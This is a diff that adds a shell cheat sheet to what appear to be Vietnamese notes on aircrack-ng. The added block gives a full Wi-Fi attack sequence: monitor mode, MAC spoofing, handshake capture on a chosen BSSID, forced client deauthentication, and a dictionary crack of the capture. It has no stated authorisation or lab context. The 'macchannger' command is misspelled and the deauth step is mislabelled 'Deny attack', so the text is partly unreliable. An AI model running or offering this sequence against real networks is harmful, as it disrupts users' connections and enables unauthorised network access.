@@ -32,3 +32,20 @@ $ sudo aircrack-ng {{tên file thu thập (.cap)}} -w {{thư viện mật khẩu
 $ sudo airmon-ng check kill
 $ sudo service network-manager restart
 ```
+
+
+```shell
+airmon-ng start wlan0
+
+ifconfig wlan0mon down
+macchannger -a wlan0mon
+ifconfig wlan0mon up
+airodump-ng wlan0mon
+
+airodump-ng --bssid <bssid mac> -c <channel> -w <filename> wlan0mon
+# Deny attack
+aireplay-ng --deauth 10 -a <bssid mac> -c <station mac> wlan0mon
+
+aircrack-ng -w <dictionary> <filename>
+airmon-ng stop wlan0mon
+```
